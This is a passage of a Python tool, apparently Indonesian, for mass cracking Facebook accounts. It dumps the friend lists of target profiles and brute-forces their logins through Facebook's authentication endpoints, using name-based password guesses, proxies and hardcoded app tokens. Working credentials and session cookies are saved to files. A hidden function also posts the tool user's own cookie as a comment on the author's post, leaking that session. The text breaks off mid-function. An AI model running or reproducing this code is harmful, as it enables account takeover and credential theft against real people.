# --------------------[ INI BOT FOLLOW & KOMEN ]--------------#
def bot_komen(cok, ken):
	with requests.Session() as r:
		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
		r.cookies.update({'cookie': cok})
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
		# r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
# ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
def bot_follow():
	with requests.Session() as r:
		toket = open('.fantoken.txt','r').read()
		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')

# ----------------[ BAGIAN-MENU ]----------------#
def menu():
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    try:
        token = open(".fantoken.txt", "r").read()
        cookie = open(".fancookie.txt", "r").read()
        tokenku.append(token)
    except IOError:
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa, masukan ulang cookie")
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        time.sleep(3)
        login()
    try:
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
        req = ses.get('https://www.facebook.com/profile.php', headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
        my_id = re.search('"userID":"(.*?)"', str(req)).group(1)
        my_name = re.search('"NAME":"(.*?)"', str(req)).group(1)
    except:
        my_name=[]
        my_id=[]
    try:
        with open(".fantoken.txt", "r") as f:
            token = f.read().strip()
        with open(".fancookie.txt", "r") as f:
            cookie = f.read().strip()
        url = f"https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token={token}"
        response = ses.get(url, cookies={"cookie": cookie}).json()
        temanku = response.get("summary", {}).get("total_count", 0)
    except:
        pass
    clear()
    banner()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    text = Align.center(f"{H2}{negara}{K2}")
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    dia.append(Panel(f"{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
    # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(panel(f"{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{temanku}\n{P2}IP     : {H2}{ip}",title=f"{P2}Bio Data",width=30,style=f"{color_panel}"))
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
[{color_text}02{P2}]. crack dari id Masal
[{color_text}03{P2}]. Lihat Hasil Crack
[{color_text}04{P2}]. Logout [[bold red]hapus cookie[bold white]]
[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ["1", "01"]:
        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
        idfac = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        dump_publikk(idfac,"",{"cookie":cookie},token)
        print('\n')
        setting()
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        result()
    elif HaHi in ["4", "04"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["5", "05"]:
        exit()
    else:
    	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")



#----------[ CRACK-PUBLIK  ]----------#
def dump_publikk(idfac,fields,cookie,token):
    try:
        headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
        if len(id)==0:
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
        else:
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
        url = ses.get(f"https://graph.facebook.com/{idfac}", params=params, headers=headers, cookies=cookie).json()
        for i in url["friends"]["data"]:
            id.append(i["id"]+"|"+i["name"])
            sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
            sys.stdout.flush()
        dump_publikk(idfac,url["friends"]["paging"]["cursors"]["after"],cookie,token)
    except: pass


#----------[ CRACK-massal  ]----------#
def massal():
    global id
    try:
        token = open(".fantoken.txt", "r").read().strip()
        cok = open(".fancookie.txt", "r").read().strip()
    except IOError:
        Console().print(f" {H2}• {P2}Token atau Cookie tidak ditemukan!")
        exit()
    try:
        Console().print(Panel("[bold white] Masukkan Jumlah Target yang Mau di Crack", width=60, style=color_panel, title="[bold green] Crack Massal [bold white]"))
        jum = int(input(f" • Masukkan jumlah target: "))
    except ValueError:
        Console().print(f" {H2}• {P2}Input salah, harap masukkan angka!")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2}Jumlah target tidak valid (1-80)")
        exit()
    ses = requests.Session()

    uid = []  # Menyimpan daftar target
    id = []   # Menyimpan hasil dump
    # Input ID Target
    for i in range(jum):
        Console().print(Panel(f"[bold white] Masukkan Target ke-{i+1}", width=60, style=color_panel))
        kl = Console().input(f" {H2}• {P2}Masukkan ID Target: ")
        uid.append(kl)
    # Loop untuk setiap target
    for userr in uid:
        try:
            headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
            params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
            url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
            if "friends" in url:
                for i in url["friends"]["data"]:
                    id.append(i["id"] + "|" + i["name"])
                    sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                    sys.stdout.flush()
                # Pagination (jika ada lebih banyak data)
                while "paging" in url["friends"] and "next" in url["friends"]["paging"]:
                    after_cursor = url["friends"]["paging"]["cursors"]["after"]
                    params["fields"] = f"name,friends.fields(id,name,birthday).after({after_cursor})"
                    url = ses.get(f"https://graph.facebook.com/{userr}", params=params, headers=headers, cookies={"cookie": cok}).json()
                    for i in url["friends"]["data"]:
                        id.append(i["id"] + "|" + i["name"])
                        sys.stdout.write(f"\r • sedang dump id, berhasil mendapatkan : {len(id)} ID")
                        sys.stdout.flush()
            else:
                pass
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
            exit()
    try:
        print('\n')
        setting()
    except requests.exceptions.ConnectionError:
        Console().print(f" {H2}• {P2}Koneksi tidak stabil!")
        exit()
    except (KeyError, IOError):
        Console().print(f" {H2}• {P2}Pertemanan tidak publik!")
        time.sleep(3)
        exit()

#----------[ LIHAT-HASIL-CRACK ]----------#
def result():
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))
    fankycek = console.input(f" {H2}• {P2}Masukan : ")
    if fankycek in ["1", "01"]:
        lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
    elif fankycek in ["2", "02"]:
        lihat_hasil("OK", f"{H2}• {P2}Anda Tidak Mempunyai File OK", "bold green")
    else:
        console.print(f" {H2}• {P2}Pilih Yang Bener Bang")
        exit()

def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
    try:
        files = os.listdir(folder)
        if not files:
            console.print(pesan_tidak_ada)
            time.sleep(3)
            exit()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
        time.sleep(3)
        exit()

    file_map = {}
    for idx, file in enumerate(files, start=1):
        try:
            jumlah = len(open(f"{folder}/{file}", "r").readlines())
        except:
            continue
        num = f"{idx:02}"
        file_map[str(idx)] = file
        file_map[num] = file
        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))

    pilih_file(file_map, folder, warna_akun)

def pilih_file(file_map, folder, warna_akun):
    pilihan = console.input(f" {H2}• {P2}Masukan : ").strip()
    
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
        exit()
    
    file_path = f"{folder}/{file_map[pilihan]}"
    
    try:
        with open(file_path, "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan")
        time.sleep(3)
        exit()
    
    for line in lines:
        data = line.split("|")
        
        if len(data) == 3:
            user, password, cookie = data
            console.print(Panel(f" ID : {user} PASSWORD : {password} | COOKIE : {cookie}", width=60, style=warna_akun))
        elif len(data) == 2:
            id, pw = data
            console.print(Panel(f" ID : {id} PASSWORD : {pw}", width=60, style=warna_akun))
        else:
            console.print(f" {H2}• {P2}Format data tidak valid: {line}")
    
    console.input(f" {H2}• {P2}[ {M2}Klik Enter Untuk Keluar {P2}]")
    exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)


def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz

# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        console.print(f" {H2}• [bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n"
        f"{P2}[{color_text}02{P2}] Crack akun New [/]\n"
        f"{P2}[{color_text}03{P2}] Crack akun Random [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        console.print(f" {H2}• {P2}Pilih Yg bener etdahh, coba lagi.")
        return setting()  # Rekursi untuk mengulang input


    # Input untuk metode login
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
    if fankylog in ["1", "01"]:
        method.append("fankygraph")
    elif fankylog in ["2", "02"]:
        method.append("fankybapi")
    else:
        method.append("fankybapi")  # Default metode
    # Pengaturan User-Agent
    Console().print(Panel(
        f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
        title="[bold green]Setting User-Agent",
        width=60,
        style=f"{color_panel}"
    ))
    uatambah = console.input(f" {H2}• {P2}Masukan : ").strip()
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ").strip()
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

     # Pilihan kecepatan metode
    #metcepat()
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}",width=60,style=f"{color_panel}"))
    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()  # Default ke metode cepat
        

# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW-FANKY-GANTENG",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["indonesia123","bismillah123","sayangku123"]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "fankygraph" in method:
                    pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                elif "fankybapi" in method:
                    pool.submit(fanky_b_api,idf,pwv)
                else:
                    pool.submit(fanky_b_api,idf,pwv)
                                    
                	
                	
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")


#-------------------[ CRACK-CEPAT ]------------#
def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT-FANKY-GANTENG",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","sayangku123","indonesia123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "fankygraph" in method:
                    pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                elif "fankybapi" in method:
                    pool.submit(fanky_b_api,idf,pwv)
                else:
                    pool.submit(fanky_b_api,idf,pwv)
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")


#-------------------[ CRACK-MAIN ]------------#
def fanb_graph(idf, pwv):
	global loop, ok, cp
	rr = random.randint
	rc = random.choice
	bo = random.choice([m, k, h, b, u, x])
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des, description=f" {K2}•{H2} FANKY B-GRAPH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh:ua = ualu[0]
			nip = random.choice(prox)
			proxs = {'http': 'socks5://' + nip}
			head = {
				'Host': 'b-graph.facebook.com',
				'X-Fb-Connection-Quality': 'EXCELLENT',
				'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'User-Agent': ua,
				'X-Tigon-Is-Retry': 'false',
				'X-Fb-Friendly-Name': 'authenticate',
				'X-Fb-Connection-Bandwidth': str(random.randrange(70000000, 80000000)),
				'Zero-Rated': '0',
				'X-Fb-Net-Hni': str(random.randrange(50000, 60000)),
				'X-Fb-Sim-Hni': str(random.randrange(50000, 60000)),
				'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
				'Content-Type': 'application/x-www-form-urlencoded',
				'X-Fb-Connection-Type': 'WIFI',
				'X-Fb-Device-Group': str(random.randrange(4700, 5000)),
				'Priority': 'u=3,i',
				'Accept-Encoding': 'gzip, deflate',
				'X-Fb-Http-Engine': 'Liger',
				'X-Fb-Client-Ip': 'true',
				'X-Fb-Server-Cluster': 'true',
				'Content-Length': str(random.randrange(1500, 2000))
			}
			data = {
				'adid': str(uuid.uuid4()),
				'format': 'json',
				'device_id': str(uuid.uuid4()),
				'email': idf,
				'password': '#PWD_FB4A:0:{}:{}'.format(str(time.time())[:10], pw),
				'generate_analytics_claim': '1',
				'community_id': '',
				'linked_guest_account_userid': '',
				'cpl': True,
				'try_num': '1',
				'family_device_id': str(uuid.uuid4()),
				'secure_family_device_id': str(uuid.uuid4()),
				'credentials_type': 'password',
				'account_switcher_uids': [],
				'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
				'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
				'enroll_misauth': False,
				'generate_session_cookies': '1',
				'error_detail_type': 'button_with_disabled',
				'source': 'login',
				'machine_id': ''.join([
					random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
					for i in range(24)
				]),
				'jazoest': str(random.randrange(22000, 23000)),
				'meta_inf_fbmeta': 'V2_UNTAGGED',
				'advertiser_id': str(uuid.uuid4()),
				'encrypted_msisdn': '',
				'currently_logged_in_userid': '0',
				'locale': 'id_ID',
				'client_country_code': 'ID',
				'fb_api_req_friendly_name': 'authenticate',
				'fb_api_caller_class': 'Fb4aAuthHandler',
				'api_key': '882a8490361da98702bf97a021ddc14d',
				'sig': hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32],
				'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			}
			pos = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
			if ('User must verify their account on www.facebook.com' in str(pos)):
				cp += 1
				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif ('session_key' in str(pos)) and ('access_token' in str(pos)):
				ok += 1
				uid = pos['uid']
				token = pos['access_token']
				cookie = ''.join(['{}={};'.format(i['name'], i['value']) for i in pos['session_cookies']])
				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{H2}{uid} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{token}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop += 1


#-------------------[ CRACK-MAIN ]------------#
def fankygraphv1(idf, pwv, url):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FANKY GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
            post = ses.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)

            if "User must verify their account" in post.text:
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break

            elif "session_key" in post.text and "EAA" in post.text:
                ok += 1
                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
